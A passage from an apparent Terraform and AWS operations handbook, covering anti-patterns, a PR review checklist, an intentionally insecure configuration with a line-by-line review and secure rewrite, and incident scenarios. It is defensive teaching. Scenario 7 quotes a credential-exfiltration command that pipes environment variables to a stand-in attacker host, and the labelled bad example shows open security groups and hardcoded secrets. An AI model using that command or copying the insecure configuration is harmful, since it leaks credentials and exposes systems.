- *Instead:* `for_each` over a map or set.

**Everything in one state file**
- *Why bad:* slow plans, enormous blast radius, lock contention, a database sharing a lifecycle with a service that deploys hourly.
- *Instead:* split by change frequency and blast radius (Chapter 8).

**Workspaces as environments**
- *Why bad:* Chapter 27.3 — wrong-environment applies, conditional soup, no staged upgrades.
- *Instead:* directories.

**`provider` blocks inside reusable modules**
- *Why bad:* the module can never be cleanly removed.
- *Instead:* `configuration_aliases` and pass providers in.

**Unpinned provider or module versions**
- *Why bad:* a plan changes because an upstream released, with no code change on your side.
- *Instead:* `~>` constraints, committed lock file, `?ref=` tags or SHAs.

**Inline `ingress`/`egress` blocks on security groups**
- *Why bad:* cycles, coarse diffs, and silent deletion of out-of-band rules.
- *Instead:* `aws_vpc_security_group_ingress_rule` / `_egress_rule`.

**`ignore_changes` with no comment**
- *Why bad:* it is indistinguishable from hiding a bug.
- *Instead:* every entry gets a comment naming what else manages that attribute.

**Provisioners for anything routine**
- *Why bad:* Chapter 15 — invisible, non-idempotent, failure taints the resource.
- *Instead:* baked images, user_data, a proper provider, or your CD pipeline.

**Deeply nested modules (module → module → module → module)**
- *Why bad:* an address like `module.a.module.b.module.c.aws_instance.d` is unreadable, and variables must be threaded through every level.
- *Instead:* at most two levels. Compose in the root module.

**A module with 40 `enable_*` booleans**
- *Why bad:* the combinatorial space is untestable, and nobody can predict what a given combination produces.
- *Instead:* smaller modules composed by the caller.

**`terraform.tfvars` committed with secrets**
- *Why bad:* secrets in git, forever, in every clone.
- *Instead:* `TF_VAR_` in CI, or better, the resource fetches the secret itself.

**`uuid()` or `timestamp()` in a resource argument**
- *Why bad:* a permanent diff; the resource is replaced on every apply.
- *Instead:* `random_id` with `keepers`, or `ignore_changes`.

### 71.2 Process anti-patterns

**Humans with apply credentials**
- *Why bad:* no audit trail, no review, no policy gate, and the credentials are a standing target.
- *Instead:* CI applies via OIDC; a break-glass role that is alarmed.

**`terraform apply -auto-approve` from a laptop**
- *Why bad:* unreviewed, unlogged, and the state lock may be the only thing standing between you and a colleague.
- *Instead:* the pipeline.

**Applying without reading the plan**
- *Why bad:* Chapter 57.3.
- *Instead:* the four-pass method; a PR summary that surfaces destroys and replacements.

**Using `-target` routinely**
- *Why bad:* produces inconsistent state; masks the real problem.
- *Instead:* split the state.

**`terraform state rm` as a debugging technique**
- *Why bad:* silently orphans real resources that keep costing money.
- *Instead:* `removed` blocks, reviewed in a PR.

**Hand-editing the state file**
- *Why bad:* it works until it does not, and when it does not you lose production.
- *Instead:* `moved`, `import`, `removed`, and restore-from-version for corruption.

**Skipping dev and staging**
- *Why bad:* production is where you discover the provider upgrade changes a default.
- *Instead:* always dev → staging → production.

**No drift detection**
- *Why bad:* an emergency console fix gets silently reverted three weeks later by an unrelated deploy.
- *Instead:* Chapter 49.

**Ignoring the plan's `Replace:` count**
- *Why bad:* this is *the* number that destroys databases.
- *Instead:* surface it at the top of the PR comment; add a policy gate.

**Merging a refactor and its `moved` block in separate commits**
- *Why bad:* `main` briefly contains a configuration that destroys the resource.
- *Instead:* one commit.

**Long-lived AWS access keys in CI**
- *Why bad:* they leak, they do not rotate, and they have no environment binding.
- *Instead:* OIDC (Chapter 46).

### 71.3 Security anti-patterns

**`AdministratorAccess` on the apply role**
- *Instead:* broad permissions with a permission boundary denying the catastrophic actions.

**`repo:org/*` in an OIDC trust policy**
- *Instead:* exact `sub` match on the environment claim.

**Passing secrets as ordinary variables**
- *Instead:* `manage_master_user_password`, ECS `secrets` blocks, write-only arguments.

**Believing `sensitive = true` protects the value**
- *Instead:* understand it only redacts output; the state is plaintext.

**Posting full plan output for stacks that handle secrets**
- *Instead:* counts and addresses only; link to the access-controlled run log.

**Unpinned third-party GitHub Actions**
- *Instead:* 40-character SHA, with Dependabot maintaining it.

**State bucket without versioning**
- *Instead:* versioning plus 365-day noncurrent retention. It converts catastrophe into inconvenience.

**Reading another team's state with `terraform_remote_state`**
- *Instead:* an SSM/Secret Manager contract (Chapter 28.4).

---

## Chapter 72 — The Terraform PR Review Checklist

```markdown
## Terraform PR review

### The plan
- [ ] I have read the plan summary line
- [ ] **Replace count is 0**, or every replacement is named, expected, and safe
- [ ] **Destroy count is 0**, or every destroy is named and expected
- [ ] No resource appears that I did not expect this PR to touch
- [ ] For every `# forces replacement`, the triggering attribute change was intentional
- [ ] `(known after apply)` on anything load-bearing (endpoints, ARNs) is understood

### Correctness
- [ ] `for_each` used for named collections; `count` only for 0-or-1
- [ ] New or renamed resources have `moved` blocks where needed, in the SAME commit
- [ ] Provider and module versions pinned
- [ ] `.terraform.lock.hcl` updated and committed if providers changed
- [ ] No hardcoded account IDs, ARNs, AMI IDs or region strings
- [ ] Variables have descriptions, types, and validation where meaningful

### Security
- [ ] No secrets in variables, tfvars, outputs, or resource arguments
- [ ] New IAM policies are least-privilege — no `Action: "*"` on `Resource: "*"`
- [ ] Security group rules: no `0.0.0.0/0` except 443 on a public ALB
- [ ] Encryption at rest enabled on every new data store
- [ ] New S3 buckets: public access block, versioning, encryption, ownership controls
- [ ] No `provisioner`, `null_resource` with `local-exec`, or `external` data source
- [ ] If a new provider or module source is added, I have looked at what it is

### Production safety
- [ ] `prevent_destroy` on new stateful resources
- [ ] `deletion_protection` where the provider supports it
- [ ] `apply_immediately = false` on RDS in production
- [ ] `ignore_changes` entries each have a comment naming the other owner
- [ ] Log groups have `retention_in_days`
- [ ] Alarms exist for anything new that can fail silently

### Cost
- [ ] Infracost diff reviewed; any increase over ~$50/month is explained in the description
- [ ] No accidental NAT gateway, unused Elastic IP, or unbounded log retention
- [ ] Non-production sizing is actually non-production sized

### Process
- [ ] All CI checks green (fmt, validate, tflint, Checkov, Conftest, tests)
- [ ] Applied to dev (and staging, for production changes) first
- [ ] The description explains **why**, not just what
- [ ] Rollback plan stated for anything risky
```

🧠 **Print this.** The three lines that prevent the most damage are the Replace count, the Destroy count, and "no resource I did not expect".
---

## Chapter 73 — A Bad Configuration, Reviewed Line by Line

Here is a configuration of a kind I have seen many times. It works. It creates a running service. It is also a production incident waiting to happen.

### 73.1 The original

```hcl
# ⚠️ INTENTIONALLY BAD EXAMPLE — DO NOT COPY
# main.tf

provider "aws" {
  region     = "us-east-1"
  access_key = "AKIAIOSFODNN7EXAMPLE"
  secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}

variable "env" {
  default = "prod"
}

variable "db_password" {
  default = "Password123!"
}

resource "aws_instance" "web" {
  count         = 3
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  subnet_id     = "subnet-12345678"

  vpc_security_group_ids = [aws_security_group.web.id]

  provisioner "remote-exec" {
    inline = [
      "sudo yum install -y docker",
      "sudo service docker start",
      "sudo docker run -d -p 80:8080 myapp:latest",
    ]
    connection {
      type        = "ssh"
      user        = "ec2-user"
      private_key = file("~/.ssh/id_rsa")
      host        = self.public_ip
    }
  }

  tags = {
    Name = "web-${count.index}"
  }
}

resource "aws_security_group" "web" {
  name = "web-sg"

  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_db_instance" "db" {
  identifier          = "proddb"
  engine              = "mysql"
  instance_class      = "db.t2.micro"
  allocated_storage   = 20
  username            = "admin"
  password            = var.db_password
  publicly_accessible = true
  skip_final_snapshot = true
}

resource "aws_s3_bucket" "data" {
  bucket = "company-data"
  acl    = "public-read"
}

output "db_password" {
  value = var.db_password
}
```

### 73.2 The review

| Line | Severity | Problem | Why it matters |
|---|---|---|---|
| `access_key` / `secret_key` in the provider | 🔴 **Critical** | Long-lived credentials committed to git | They are now in every clone, every fork, and every CI log. Rotate immediately |
| No `required_version` / `required_providers` | 🟠 High | Anyone's CLI and provider version is used | Plans differ between machines; upgrades are uncontrolled |
| No `backend` block | 🔴 Critical | State is local | Not shared, not locked, one laptop failure from gone |
| `region = "us-east-1"` hardcoded | 🟡 Medium | Cannot be reused | And it is probably the wrong region for the users |
| No `allowed_account_ids` | 🟠 High | No protection against the wrong account | One `AWS_PROFILE` mistake applies "prod" to the wrong place |
| `var.env` defaults to `"prod"` | 🟠 High | The safe default is the dangerous one | Forget to set it and you are in production |
| `var.db_password` with a default | 🔴 Critical | A hardcoded secret in git, and a weak one | Also enters state, plan output and the `output` block below |
| `count = 3` on instances | 🟡 Medium | Index-based identity | Removing the middle one shuffles the others (Chapter 13.2) |
| Hardcoded `ami-0c55b159cbfafe1f0` | 🟠 High | Frozen, region-specific, unpatched | This AMI is years old and no longer receives security updates |
| `t2.micro` | 🟡 Medium | Previous-generation burstable | `t3a.micro` or `t4g.micro` is cheaper and faster |
| Hardcoded `subnet-12345678` | 🟠 High | Not portable; no AZ spread | All three instances may be in one AZ |
| `remote-exec` provisioner | 🟠 High | Invisible to the plan, not idempotent, needs SSH from the runner | Chapter 15. Also `myapp:latest` is an unpinned image |
| `private_key = file("~/.ssh/id_rsa")` | 🔴 Critical | A personal SSH key read by Terraform | Cannot run in CI; the key is now in memory and possibly in logs |
| SG ingress `0-65535` from `0.0.0.0/0` | 🔴 **Critical** | **Every TCP port open to the internet** | This is a complete compromise of the instances |
| SG ingress `22` from `0.0.0.0/0` | 🔴 Critical | SSH open to the world | Constant brute-force; use SSM Session Manager instead |
| `name = "web-sg"` (not `name_prefix`) | 🟡 Medium | Blocks `create_before_destroy` | Any change causing replacement takes downtime |
| Inline `ingress`/`egress` blocks | 🟡 Medium | Authoritative; silently deletes out-of-band rules | Chapter 30.6 |
| No `vpc_id` on the security group | 🟠 High | Created in the default VPC | Which you should not be using at all |
| RDS `publicly_accessible = true` | 🔴 **Critical** | The database is reachable from the internet | Combined with `admin`/`Password123!`, this is a breach |
| RDS `skip_final_snapshot = true` | 🔴 Critical | Deleting the DB loses all data with no recovery | |
| No `storage_encrypted` | 🔴 Critical | Data unencrypted at rest | Fails nearly every compliance framework |
| No `deletion_protection` | 🟠 High | One `terraform destroy` from data loss | |
| No `prevent_destroy` | 🟠 High | Terraform will happily plan the destroy | |
| No `backup_retention_period` | 🔴 Critical | Default is 0 in some contexts — **no backups at all** | |
| No `db_subnet_group_name` | 🟠 High | Lands in the default VPC's subnets | |
| No `vpc_security_group_ids` | 🔴 Critical | Uses the default security group | |
| `db.t2.micro` for "proddb" | 🟡 Medium | 1 vCPU, 1 GB RAM, burstable | Will fall over under real load |
| `engine = "mysql"` with no `engine_version` | 🟠 High | Version drifts with provider defaults | Pin it |
| S3 `acl = "public-read"` | 🔴 **Critical** | **The bucket is world-readable** | Also, `acl` is deprecated — object ownership is now enforced |
| `bucket = "company-data"` | 🟡 Medium | Globally unique namespace, no environment suffix | Will collide; also leaks the company name |
| No versioning, encryption, or public access block on S3 | 🔴 Critical | No recovery from deletion, no encryption | |
| `output "db_password"` | 🔴 **Critical** | Prints the password in plaintext on every apply | And it is not even marked `sensitive` |
| No tags anywhere except `Name` | 🟡 Medium | No cost allocation, no ownership, no drift auditing | |

**Tally: 13 critical, 10 high, 8 medium.** And it works perfectly well in a demo.

### 73.3 The rewrite

```hcl
# ============================================================
# terraform.tf
# ============================================================
terraform {
  required_version = "~> 1.16.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 6.66"
    }
  }

  backend "s3" {
    bucket       = "acme-tfstate-123456789012"
    key          = "apps/web/production/terraform.tfstate"
    region       = "ap-south-1"
    encrypt      = true
    kms_key_id   = "alias/tfstate"
    use_lockfile = true
  }
}

# Credentials come from the environment — OIDC in CI, SSO locally. Never from code.
provider "aws" {
  region              = var.aws_region
  allowed_account_ids = [var.aws_account_id]

  default_tags {
    tags = local.common_tags
  }
}

# ============================================================
# variables.tf
# ============================================================
variable "aws_region" {
  description = "AWS region for all resources."
  type        = string
  default     = "ap-south-1"
}

variable "aws_account_id" {
  description = "Expected AWS account ID. Terraform refuses to run against any other."
  type        = string

  validation {
    condition     = can(regex("^[0-9]{12}$", var.aws_account_id))
    error_message = "aws_account_id must be exactly 12 digits."
  }
}

variable "environment" {
  description = "Deployment environment."
  type        = string
  # ✅ NO DEFAULT. The caller must state which environment they mean.

  validation {
    condition     = contains(["dev", "staging", "production"], var.environment)
    error_message = "environment must be dev, staging or production."
  }
}

variable "project" {
  description = "Project name, used as a resource name prefix."
  type        = string
  default     = "acme"
}

variable "owning_team" {
  description = "Team responsible for this stack. Used for the Owner tag and paging."
  type        = string
}

variable "cost_center" {
  description = "Cost allocation code."
  type        = string
}

variable "image" {
  description = "Container image including tag or digest. Prefer a digest in production."
  type        = string

  validation {
    condition     = !endswith(var.image, ":latest")
    error_message = "The ':latest' tag is not permitted — it is not reproducible."
  }
}

variable "desired_count" {
  description = "Number of tasks to run."
  type        = number
  default     = 3

  validation {
    condition     = var.desired_count >= 2
    error_message = "At least two tasks are required for availability."
  }
}

variable "admin_cidrs" {
  description = "CIDR blocks permitted administrative access. Never 0.0.0.0/0."
  type        = list(string)
  default     = []

  validation {
    condition     = !contains(var.admin_cidrs, "0.0.0.0/0")
    error_message = "0.0.0.0/0 is not permitted for administrative access."
  }
}

# ============================================================
# locals.tf
# ============================================================
locals {
  name_prefix   = "${var.project}-${var.environment}"
  is_production = var.environment == "production"

  common_tags = {
    Project     = var.project
    Environment = var.environment
    ManagedBy   = "terraform"
    Repository  = "acme/infrastructure"
    Stack       = "apps/web"
    Owner       = var.owning_team
    CostCenter  = var.cost_center
  }
}

data "aws_caller_identity" "current" {}

# ============================================================
# Networking — read from the foundation stack's published contract
# ============================================================
data "aws_ssm_parameter" "vpc_id" {
  name = "/${var.project}/${var.environment}/network/vpc_id"
}

data "aws_ssm_parameter" "private_subnet_ids" {
  name = "/${var.project}/${var.environment}/network/private_subnet_ids"
}

data "aws_ssm_parameter" "database_subnet_ids" {
  name = "/${var.project}/${var.environment}/network/database_subnet_ids"
}

data "aws_ssm_parameter" "ecs_cluster_arn" {
  name = "/${var.project}/${var.environment}/compute/ecs_cluster_arn"
}

# ============================================================
# Compute — Fargate, not hand-provisioned EC2
# ============================================================
module "web" {
  source = "git::ssh://git@github.com/acme/terraform-modules.git//ecs-service?ref=v3.2.0"

  name        = "web"
  environment = var.environment

  cluster_arn = data.aws_ssm_parameter.ecs_cluster_arn.value
  vpc_id      = data.aws_ssm_parameter.vpc_id.value
  subnet_ids  = split(",", data.aws_ssm_parameter.private_subnet_ids.value)

  image            = var.image
  container_port   = 8080
  cpu              = local.is_production ? 1024 : 512
  memory           = local.is_production ? 2048 : 1024
  cpu_architecture = "ARM64"
  desired_count    = var.desired_count

  health_check_path = "/actuator/health"

  autoscaling = {
    min_capacity = var.desired_count
    max_capacity = var.desired_count * 5
    cpu_target   = 70
  }

  # ✅ The ARN, not the value. The ECS agent resolves it at task start.
  secrets = {
    DB_PASSWORD = aws_db_instance.main.master_user_secret[0].secret_arn
  }

  tags = local.common_tags
}

# ============================================================
# Security groups — standalone rules, no 0.0.0.0/0 ingress
# ============================================================
resource "aws_security_group" "database" {
  name_prefix = "${local.name_prefix}-db-"
  description = "MySQL, reachable only from the web service"
  vpc_id      = data.aws_ssm_parameter.vpc_id.value

  tags = merge(local.common_tags, { Name = "${local.name_prefix}-db" })

  lifecycle { create_before_destroy = true }
}

resource "aws_vpc_security_group_ingress_rule" "db_from_web" {
  security_group_id            = aws_security_group.database.id
  referenced_security_group_id = module.web.security_group_id
  from_port                    = 3306
  to_port                      = 3306
  ip_protocol                  = "tcp"
  description                  = "MySQL from the web service"
}

# ============================================================
# Database
# ============================================================
resource "aws_kms_key" "data" {
  description             = "${local.name_prefix} data encryption"
  deletion_window_in_days = 30
  enable_key_rotation     = true
  tags                    = local.common_tags

  lifecycle { prevent_destroy = true }
}

resource "aws_kms_alias" "data" {
  name          = "alias/${local.name_prefix}-data"
  target_key_id = aws_kms_key.data.key_id
}

resource "aws_db_subnet_group" "main" {
  name       = "${local.name_prefix}-mysql"
  subnet_ids = split(",", data.aws_ssm_parameter.database_subnet_ids.value)
  tags       = local.common_tags
}

resource "aws_db_instance" "main" {
  identifier = "${local.name_prefix}-mysql"

  engine         = "mysql"
  engine_version = "8.4"                                  # ✅ pinned
  instance_class = local.is_production ? "db.r6g.large" : "db.t4g.micro"

  allocated_storage     = 100
  max_allocated_storage = 500
  storage_type          = "gp3"
  storage_encrypted     = true                            # ✅
  kms_key_id            = aws_kms_key.data.arn

  db_name  = "app"
  username = "appadmin"

  # ✅ AWS generates, stores and rotates the password.
  # Terraform never sees the value, so it never enters state.
  manage_master_user_password   = true
  master_user_secret_kms_key_id = aws_kms_key.data.arn

  db_subnet_group_name   = aws_db_subnet_group.main.name
  vpc_security_group_ids = [aws_security_group.database.id]
  publicly_accessible    = false                          # ✅
  port                   = 3306

  multi_az = local.is_production

  backup_retention_period  = local.is_production ? 30 : 7  # ✅
  backup_window            = "18:00-19:00"
  maintenance_window       = "sun:19:30-sun:20:30"
  copy_tags_to_snapshot    = true
  delete_automated_backups = false

  deletion_protection       = local.is_production          # ✅
  skip_final_snapshot       = !local.is_production         # ✅
  final_snapshot_identifier = local.is_production ? "${local.name_prefix}-final-${formatdate("YYYYMMDDhhmmss", timestamp())}" : null

  performance_insights_enabled    = true
  performance_insights_kms_key_id = aws_kms_key.data.arn
  monitoring_interval             = 60
  monitoring_role_arn             = aws_iam_role.rds_monitoring.arn
  enabled_cloudwatch_logs_exports = ["error", "slowquery"]

  auto_minor_version_upgrade = !local.is_production
  apply_immediately          = false                       # ✅

  tags = local.common_tags

  lifecycle {
    prevent_destroy = true                                 # ✅
    ignore_changes = [
      final_snapshot_identifier,   # timestamp() changes every plan
      master_user_secret,          # AWS rotates this
      engine_version,              # minor upgrades happen in the maintenance window
    ]
  }
}

# ============================================================
# S3 — private, encrypted, versioned
# ============================================================
resource "aws_s3_bucket" "data" {
  # ✅ account ID makes the globally-unique name collision-proof
  bucket = "${local.name_prefix}-data-${data.aws_caller_identity.current.account_id}"
  tags   = local.common_tags

  lifecycle { prevent_destroy = true }
}

resource "aws_s3_bucket_public_access_block" "data" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_ownership_controls" "data" {
  bucket = aws_s3_bucket.data.id
  rule { object_ownership = "BucketOwnerEnforced" }
}

resource "aws_s3_bucket_versioning" "data" {
  bucket = aws_s3_bucket.data.id
  versioning_configuration { status = "Enabled" }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  bucket = aws_s3_bucket.data.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.data.arn
    }
    bucket_key_enabled = true      # 💰 reduces KMS request costs substantially
  }
}

resource "aws_s3_bucket_lifecycle_configuration" "data" {
  bucket = aws_s3_bucket.data.id

  rule {
    id     = "manage-noncurrent-and-multipart"
    status = "Enabled"
    filter {}

    noncurrent_version_expiration { noncurrent_days = 90 }
    abort_incomplete_multipart_upload { days_after_initiation = 7 }
  }
}

# ============================================================
# Outputs — no secrets
# ============================================================
output "service_name" {
  description = "Name of the ECS service."
  value       = module.web.service_name
}

output "db_endpoint" {
  description = "Database endpoint. The password is in Secrets Manager."
  value       = aws_db_instance.main.endpoint
}

output "db_password_secret_arn" {
  description = "ARN of the Secrets Manager secret holding the master password."
  value       = aws_db_instance.main.master_user_secret[0].secret_arn
  # ✅ The ARN is not sensitive. The value is never exposed.
}

output "data_bucket" {
  description = "Name of the application data bucket."
  value       = aws_s3_bucket.data.id
}
```

### 73.4 What changed, thematically

| Theme | Before | After |
|---|---|---|
| Credentials | Hardcoded keys | Environment / OIDC, with `allowed_account_ids` |
| State | Local | S3, encrypted, locked, versioned |
| Secrets | Plaintext variable, printed as an output | AWS-managed, ARN-referenced, never in state |
| Network exposure | All ports from the internet | Private subnets, SG-to-SG references only |
| Compute | Hand-provisioned EC2 with SSH provisioners | Fargate via a versioned module |
| Data protection | None | KMS, versioning, backups, deletion protection, `prevent_destroy` |
| Environments | A `"prod"` default | Required variable with validation |
| Reproducibility | `:latest`, floating AMI, unpinned provider | Pinned image, pinned provider, pinned module |
| Operations | No tags, no monitoring | Full tagging, Performance Insights, log exports |

🧠 The rewrite is about three times longer. **That ratio is normal and correct.** The extra length is entirely safety controls, and every one of them corresponds to an incident somebody has already had.
---

## Chapter 74 — Real-World Scenarios, With Solutions

### Scenario 1 — Two engineers apply at the same time

**Symptom.** Engineer A's apply is running. Engineer B runs apply and gets:

```
Error: Error acquiring the state lock
Lock Info:
  ID:        a1b2c3d4-...
  Who:       alice@laptop
  Operation: OperationTypeApply
```

**What is happening.** The lock is working exactly as designed.

**What to do.** Wait. Use `-lock-timeout=10m` so it queues instead of failing.

⚠️ **What NOT to do:** `-lock=false`, or `force-unlock`. If B force-unlocks and applies while A is still running, both write state. The second write wins, the first apply's resources become orphans, and you have split-brain (Chapter 23.4).

**Prevention.** Nobody applies from a laptop. CI applies, with a concurrency group per stack and `cancel-in-progress: false`. Then this scenario becomes "the second run waits in the queue", which is correct and invisible.

---

### Scenario 2 — Someone changed something in the console

**Symptom.** The nightly drift job opens an issue: a security group has an extra ingress rule.

**Diagnosis.**

```bash
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceName,AttributeValue=sg-0abc123 \
  --start-time "$(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%SZ)" \
  --query 'Events[].{time:EventTime,user:Username,event:EventName}' --output table
```

**Decision tree.**

```mermaid
flowchart TD
    A["Drift detected"] --> B["Find out WHO and WHY<br/>via CloudTrail"]
    B --> C{"Was the change<br/>legitimate?"}
    C -->|"Emergency fix,<br/>still needed"| D["✅ CODIFY IT.<br/>Add it to the configuration,<br/>then apply — which is a no-op."]
    C -->|"Emergency fix,<br/>no longer needed"| E["✅ Let the next apply revert it.<br/>Close the drift issue."]
    C -->|"Wrong / unauthorised"| F["✅ Apply to revert.<br/>Then find out how someone<br/>had console write access."]
    C -->|"Legitimate, but managed<br/>by another system"| G["✅ ignore_changes,<br/>WITH a comment saying<br/>what manages it."]
```

⚠️ **The trap: applying to revert without asking why.** If the change was an emergency fix keeping production alive, reverting it re-breaks production — and the person who made it is not watching your apply.

**Prevention.** Remove human console write access in production. Give a break-glass role that alarms on use, so emergency changes are visible the moment they happen rather than three weeks later.

---

### Scenario 3 — The plan says your production RDS will be replaced

**Symptom.**

```
-/+ resource "aws_db_instance" "main" {
      ~ availability_zone = "ap-south-1a" -> "ap-south-1b" # forces replacement
```

**🔴 DO NOT APPLY.**

**What to do.**

1. Find the `# forces replacement` comment. That attribute is the cause.
2. Ask: did I intend to change that? Almost always, no.
3. Revert that attribute in the configuration.
4. Re-plan. It should now show either no changes or an in-place update.

**If the change is genuinely required** (a real migration, not an accident):

1. It is a project, not a PR. Plan a migration: snapshot, restore to the new configuration, test, cut over DNS, decommission.
2. Never let Terraform perform the replacement of a production database in a single apply.

**Prevention.** `prevent_destroy = true` would have made this plan *fail*, which is exactly right. `deletion_protection = true` would have made the apply fail at the API. A Conftest rule denying replacement of stateful types in production makes it fail in CI.

---

### Scenario 4 — The state file is gone

**Symptom.** `Plan: 247 to add, 0 to change, 0 to destroy.`

**🔴 DO NOT APPLY.** You will create a duplicate of everything, or fail on name collisions halfway through and be in a much worse position.

**Recovery.** Chapter 23.1, in order: S3 object versions → a local `.terraform.tfstate.backup` → a CI artifact → rebuild by importing.

```bash
aws s3api list-object-versions \
  --bucket acme-tfstate-123456789012 \
  --prefix apps/api/production/terraform.tfstate \
  --query 'Versions[*].[VersionId,LastModified,Size]' --output table

aws s3api get-object \
  --bucket acme-tfstate-123456789012 \
  --key apps/api/production/terraform.tfstate \
  --version-id <ID> recovered.tfstate

# Sanity-check before pushing
jq '.resources | length' recovered.tfstate

terraform state push recovered.tfstate
terraform plan     # must show: No changes
```

**Prevention.** Versioning on the state bucket, 365-day noncurrent retention, `prevent_destroy` on the bucket, and a quarterly recovery drill (Chapter 23.7).

---

### Scenario 5 — A provider upgrade wants to replace resources

**Symptom.** After `terraform init -upgrade`, the plan shows replacements you did not ask for.

**Diagnosis.**

1. Read the provider CHANGELOG for every version you skipped.
2. Read the upgrade guide if it was a major bump.
3. Identify the attribute driving the replacement. It is usually a default that changed.

**What to do.**

```hcl
# Option A — explicitly set the old value so nothing changes
resource "aws_ecs_service" "this" {
  availability_zone_rebalancing = "DISABLED"   # was the old implicit default
}

# Option B — accept the new default, but schedule the replacement deliberately
# Option C — pin the provider back, and plan the upgrade properly
```

⚠️ **Never apply a surprise replacement just because the provider upgrade suggested it.**

**Prevention.** Upgrade in dev first, always. Read the changelog. Upgrade one minor at a time rather than jumping six versions.

---

### Scenario 6 — A module change will affect 30 environments

**Symptom.** You need to change `modules/ecs-service`, which 30 stacks consume via `?ref=v3.1.0`.

**What to do.**

```mermaid
flowchart TD
    A["Change needed in a shared module"] --> B["1. Make the change on a branch.<br/>Add a moved block if any<br/>resource address changed."]
    B --> C["2. Release it as a NEW VERSION.<br/>v3.2.0 (minor) or v4.0.0 (breaking)."]
    C --> D["3. Bump ONE dev stack to the new ref.<br/>Read that plan very carefully."]
    D --> E{"Plan is what<br/>you expected?"}
    E -->|"no"| F["Fix the module. Release v3.2.1."]
    F --> D
    E -->|"yes"| G["4. Roll out to the remaining<br/>dev stacks. Then staging.<br/>Then production, in batches."]
    G --> H["5. Never bump all 30 in one PR."]
```

🧠 **The reason module versioning exists is precisely this.** If all 30 stacks used `source = "../../modules/ecs-service"`, your change would hit all of them at once, with no staged rollout possible.

**Prevention.** Versioned module references from the start. A `moved` block shipped with any internal rename. A dev stack that always gets the new version first.

---

### Scenario 7 — A fork PR tries to exfiltrate credentials

**Symptom.** A PR from an external fork adds:

```hcl
data "external" "x" {
  program = ["bash", "-c", "env | base64 | curl -X POST --data-binary @- https://evil.example.com"]
}
```

**What should happen.**

1. GitHub's default for public repositories requires approval before running workflows on fork PRs. That is the first gate.
2. The `pull_request` job assumes the **read-only plan role**, so even if it runs, the stolen credentials can only read.
3. A Conftest policy denying `external` data sources fails the build.
4. A reviewer sees the diff.

**What must NOT be true:**

- ❌ `pull_request_target` used with a checkout of the PR head. This runs untrusted code with the base repository's secrets.
- ❌ The apply role assumable from a `pull_request` subject.
- ❌ No CODEOWNERS on `.github/workflows/` — an attacker could otherwise just change the workflow.

🧠 **Note that even a "plan-only" job is not inherently safe.** A plan executes `external` data sources and downloads and runs provider binaries. The read-only role is what limits the damage, not the fact that it is a plan.

---

### Scenario 8 — The apply failed halfway

**Symptom.**

```
aws_ecs_service.api: Creation complete after 2m31s
aws_lb_listener_rule.api: Creating...

Error: creating ELBv2 Listener Rule: PriorityInUse

Apply complete! Resources: 8 added, 0 changed, 0 destroyed.
Error: ... 1 resource failed
```

**What is true.** Terraform writes state incrementally. The 8 resources that succeeded are in state, correctly. Nothing is lost.

**What to do.**

1. Fix the cause — here, pick an unused listener priority.
2. `terraform plan` — it shows only the remaining work.
3. `terraform apply`.

**The harder case: a resource was created in the cloud but the state write failed.**

```
Error: creating S3 Bucket: BucketAlreadyOwnedByYou
```

Terraform created it, then lost connectivity before recording it. Fix by importing:

```hcl
import {
  to = aws_s3_bucket.new
  id = "acme-production-new"
}
```

**Prevention.** Idempotent naming (`name_prefix`), and allocating listener priority ranges per service so two stacks cannot collide.

---

### Scenario 9 — Rename a resource without destroying it

**Symptom.** You want `aws_instance.web` to be called `aws_instance.api`.

**Naive approach:** rename it. Plan says `1 to add, 1 to destroy`. 🔴

**Correct approach:**

```hcl
# Same commit as the rename
moved {
  from = aws_instance.web
  to   = aws_instance.api
}
```

```
Plan: 0 to add, 0 to change, 0 to destroy.
```

Same technique for moving into a module, out of a module, or converting `count` to `for_each` (Chapter 16.1).

---

### Scenario 10 — Split one giant state file

**Symptom.** One state has 1,400 resources. Plans take eleven minutes. Everyone is afraid of it.

**Approach.** Chapter 22, plus these operational rules:

1. **One stack at a time.** Do not attempt a three-way split in one go.
2. Start with the **most independent** piece — usually something with few inbound dependencies, like observability or a standalone queue.
3. Back up state before every step.
4. The acceptance test is `No changes` in **both** stacks.
5. Do it on a quiet day with a colleague watching.
6. Prefer the **import/removed** path over `state mv` for fewer than ~20 resources — it is fully code-reviewed and runs in CI.

⚠️ **The single most common mistake** is moving the state but forgetting to add the output and cross-stack reference, so the downstream stack plans to create its own copy of something that already exists.

---

### Scenario 11 — Secrets ended up in state

**Symptom.** A colleague notices `"password": "hunter2"` while inspecting state.

**What to do, in order.**

1. **🔴 Rotate the secret. Now.** Everything else is secondary.
2. Work out the exposure window: `aws s3api list-object-versions` on the state key tells you how long it was there; CloudTrail `GetObject` calls tell you who read it.
3. Fix the configuration: `manage_master_user_password`, write-only arguments, or an ARN reference.
4. Decide about state history. Old S3 versions still contain it. If the exposure crossed a trust boundary, purge them — but take a fresh backup first, because you are destroying your recovery window.
5. Add a policy check so a secret cannot enter state the same way again.

⚠️ **Deleting the state object does not help.** Versioning retains it. CI logs may have it. Anyone with read access already had the opportunity.

---

### Scenario 12 — The CI role has admin and security noticed

**Symptom.** A security review flags that `terraform-apply` has `AdministratorAccess`.

**The honest position.** Scoping a Terraform apply role precisely is genuinely hard. It must create IAM roles, KMS keys, VPCs, databases — most of the API surface. Many teams give up and grant admin.

**The pragmatic solution** (Chapter 31.5): keep broad permissions, add a **permission boundary** that denies the specific catastrophic actions:

```hcl
data "aws_iam_policy_document" "terraform_boundary" {
  statement {
    effect    = "Allow"
    actions   = ["*"]
